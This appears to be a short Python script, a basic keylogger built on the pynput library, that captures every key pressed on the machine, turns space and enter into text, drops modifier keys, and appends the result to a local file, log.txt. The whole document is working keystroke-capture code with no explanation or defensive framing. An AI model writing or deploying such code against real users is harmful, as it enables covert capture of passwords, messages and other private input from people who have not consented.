from pynput.keyboard import Listener
#storing the keystrokes in a text file
non_values = ["key.shift_r", "key.shift_l", "key.backspace", "key.ctrl_l", "key.ctrl_r"]

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")
    if letter == "Key.space":
        letter = " " 
    if letter == "Key.enter":
        letter = "\n" 
    if letter.lower() in non_values:
        letter = ""
    with  open("log.txt", 'a') as f:
        f.write(letter)   

with Listener(on_press=write_to_file) as l:
    l.join()
